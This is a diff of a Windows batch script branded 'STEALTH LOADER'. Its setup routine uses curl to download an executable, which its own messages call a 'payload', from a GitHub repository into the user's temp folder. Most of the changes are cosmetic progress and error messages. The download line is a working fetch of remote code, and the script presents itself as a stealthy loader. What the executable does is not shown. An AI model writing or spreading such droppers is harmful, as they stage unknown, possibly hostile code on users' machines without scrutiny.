@@ -52,19 +52,40 @@ goto :STEALTH_MENU
 
 :SETUP
 cls
-echo [*] Connecting to GitHub...
+echo ==================================================
+echo              STEALTH LOADER - SETUP
+echo --------------------------------------------------
+echo [*] Initializing setup process...
+timeout /t 1 >nul
+
+echo [1/4] Preparing environment...
+timeout /t 1 >nul
+
+echo [2/4] Connecting to GitHub repository...
+timeout /t 1 >nul
+
+echo [3/4] Downloading payload: CAXVN.exe
 curl -L -o "%temp%\CAXVN.exe" "https://github.com/maxyprime/stealthloaderv2/raw/main/CAXVN.exe"
 
 if exist "%temp%\CAXVN.exe" (
-    echo [✓] Downloaded CAXVN.exe successfully.
+    echo [✓] Download complete.
+    echo [4/4] Verifying and finalizing setup...
+    timeout /t 1 >nul
+    echo [✓] CAXVN.exe ready in temp directory.
+    echo --------------------------------------------------
+    echo [✔] Setup completed successfully.
 ) else (
-    echo [✖] Failed to download EXE.
+    echo [✖] ERROR: Failed to download CAXVN.exe
+    echo [!] Please check your internet connection or GitHub link.
+    echo --------------------------------------------------
     pause
     goto STEALTH_MENU
 )
 
+echo --------------------------------------------------
 pause
 goto STEALTH_MENU
+
 
 
 :RUN
